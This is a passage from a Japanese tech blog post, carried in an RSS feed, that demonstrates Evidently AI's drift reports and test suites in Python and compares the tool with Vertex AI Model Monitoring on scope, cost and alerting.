[★1]ここは適宜変更可能</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">report.run(current_data=data1, reference_data=data2, column_mapping=<span class="literal">None</span>)</span><br><span class="line">report.show(mode=<span class="string">&#x27;inline&#x27;</span>) <span class="comment"># Notebookのセル出力で結果を表示する</span></span><br><span class="line"><span class="comment"># report.save_html(&#x27;report.html&#x27;) # HTML形式で出力したい場合</span></span><br></pre></td></tr></table></figure><p>すると、以下のように各特徴量の分布が可視化されたものが出力されます。</p><p>一度に複数の特徴量分布の差を比較できる、分かりやすいレポートです。分布間の距離計算アルゴリズムは、データの数や種類に応じて適切なものを自動で選択しているようです。（<a href="https://docs.evidentlyai.com/reference/data-drift-algorithm">公式の解説</a>）</p><img src="/images/20230413a/image_20.png" alt="" width="1200" height="934" loading="lazy"><p>今回は、ソースコードの<code>[★1]</code>の部分に<code>DataDriftPreset()</code>を入れてレポートを出力しました。<br><code>DataDriftPreset()</code>は、データのドリフトを検出するためのプリセットであり、これをReportで出力しました。<br>Evidently AIではこのようなプリセットが複数用意されてあります。</p><p>試しに、<code>DataDriftPreset()</code>を<code>DataQualityPreset()</code>に書き換えてみると、次のようなレポートが得られます。<br>データの統計的情報が可視化されていることが分かります。</p><img src="/images/20230413a/image_21.png" alt="" width="1200" height="560" loading="lazy"><img src="/images/20230413a/image_22.png" alt="" width="1200" height="580" loading="lazy"><p>他に用意されているプリセットなど、詳しくは<a href="https://docs.evidentlyai.com/reference/all-metrics">公式ドキュメント</a>をご覧ください。</p><h3 id="6-2-4-Testを使う"><a href="#6-2-4-Testを使う" class="headerlink" title="6.2.4. Testを使う"></a>6.2.4. Testを使う</h3><p><code>6.2.3. Reportを使ってみる</code>と似ていますが、以下のコードを作成し、実行してみました。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> evidently.test_suite <span class="keyword">import</span> TestSuite</span><br><span class="line"><span class="keyword">from</span> evidently.test_preset <span class="keyword">import</span> DataStabilityTestPreset</span><br><span class="line"></span><br><span class="line">data1 = pd.read_csv(<span class="string">&#x27;hour-2012-01.csv&#x27;</span>) <span class="comment"># 比較する1つ目のデータ</span></span><br><span class="line">data2 = pd.read_csv(<span class="string">&#x27;hour-2012-02.csv&#x27;</span>) <span class="comment"># 比較する2つ目のデータ</span></span><br><span class="line"></span><br><span class="line">test = TestSuite(tests=[</span><br><span class="line">    DataStabilityTestPreset(), <span class="comment"># [★2]ここは適宜変更可能</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">test.run(current_data=data1, reference_data=data2, column_mapping=<span class="literal">None</span>)</span><br><span class="line">test.show(mode=<span class="string">&#x27;inline&#x27;</span>) <span class="comment"># Notebookのセル出力で結果を表示する</span></span><br><span class="line"><span class="comment"># test.save_html(&#x27;test.html&#x27;) # HTML形式で出力したい場合</span></span><br></pre></td></tr></table></figure><p>すると、以下のようなテスト結果が返ってきます。<br>今回は53個のテスト項目があり、そのうち42件が合格、11件が不合格だったようです。</p><img src="/images/20230413a/image_23.png" alt="" width="1200" height="946" loading="lazy"><p>Share of Out-of-Range Values（範囲外の値が含まれる割合が一定値を超えていた）という理由で不合格でした。</p><img src="/images/20230413a/image_24.png" alt="" width="1200" height="368" loading="lazy"><p>今回は<code>[★2]</code>で<code>DataStabilityTestPreset()</code>を指定しただけで、「完全お任せでテストして！」と言っているようなものなのでいくつか不合格が出てきました。もちろん、使用状況に合わせて合格と不合格の閾値などはカスタマイズできます。</p><p>また、今回はHTMLファイル（or Notebookのセル出力）でTestの結果を表示しましたが、結果をJSONファイルとして出力することもできます。</p><p>JSONファイルはソースコードで処理しやすいのでアラート通知の仕方や通知先は自由自在です。</p><p>詳しくは<a href="https://docs.evidentlyai.com/reference/all-tests">公式ドキュメント</a>をご覧ください。</p><h2 id="6-3-コスト"><a href="#6-3-コスト" class="headerlink" title="6.3. コスト"></a>6.3. コスト</h2><p>Evidently AIは、クラウドやオンプレミスの環境での自己運用型Pythonライブラリで、OSSとして提供されます。</p><p>このため、ソフトウェアを利用するライセンス料は発生しません。Evidently AIにかかる<strong>金銭的コスト</strong>は、定期的にモニタリングジョブを動かすマシンの料金です。</p><p>Evidently AIは、Vertex AI Model Monitoringのようにノーコードで実現することはできません。簡素ではありますが、Pythonコードを書く<strong>実装コスト</strong>、及び定期的にモニタリングを実行する仕組み（<strong>運用コスト</strong>）が必要です。</p><h1 id="7-まとめ"><a href="#7-まとめ" class="headerlink" title="7. まとめ"></a>7. まとめ</h1><p>本記事では、Vertex AIのAutoMLで学習したモデルを監視することを前提に、<br>AI監視ツールである、Vertex AI Model Monitoring及びEvidently AIを具体的に利用し、その使用感を検証しました。</p><p>以下に両者の特徴をまとめました。</p><div class="scroll"><table><thead><tr><th>比較ポイント</th><th>Vertex AI Model Monitoring</th><th>Evidently AI</th></tr></thead><tbody><tr><td>監視項目の範囲</td><td>スキュー&#x2F;ドリフトのみ</td><td>スキュー&#x2F;ドリフトに加え、データ品質まで</td></tr><tr><td>実装コスト</td><td>ノーコードで実現可能</td><td>Pythonコードを書く</td></tr><tr><td>運用コスト</td><td>設定するだけでほぼ掛からない</td><td>モニタリングを定期的に実行する仕組みの構築が必要</td></tr><tr><td>金銭的コスト</td><td>1 GB のデータあたり $3.50の課金</td><td>モニタリングジョブを動かすマシンの料金</td></tr><tr><td>アラートの拡張性</td><td>メール通知のみ</td><td>JSON形式を読み取って通知をカスタマイズ</td></tr><tr><td>大規模データの注意点</td><td>金銭的コストの増加</td><td>処理の遅れ・マシンのリソース不足</td></tr></tbody></table></div><p>両者とも機械学習モデルのパフォーマンスを監視するためのプラットフォームですが、Vertex AI Model MonitoringはGoogle Cloud上で提供されるマネージドサービスの一部であり、Googleが提供する機械学習インフラストラクチャの一部です。</p><p>一方、Evidently AIは、クラウドやオンプレミスの環境で自己運用型のOSSとして提供されます。</p><p>Vertex AI Model Monitoringは、ドリフト&#x2F;スキューを監視することができますが、Evidently AIは、ドリフト&#x2F;スキューだけでなく、入力データの品質等、より広範な指標を監視することができます。</p><p>Vertex AI Model Monitoringよりも幅広い項目を監視したいと思う場合、Evidently AIを検討することをおすすめします。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/DataScience/">DataScience</category>
      
      
      <category domain="https://future-architect.github.io/tags/MLOps/">MLOps</category>
      
      <category domain="https://future-architect.github.io/tags/Evidently-AI/">Evidently AI</category>
      
      <category domain="https://future-architect.github.io/tags/Vertex-AI-Model-Monitoring/">Vertex AI Model Monitoring</category>
      
      <category domain="https://future-architect.github.io/tags/AI%E7%9B%A3%E8%A6%96/">AI監視</category>
      
      
      <comments>https://future-architect.github.io/articles/20230413a/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
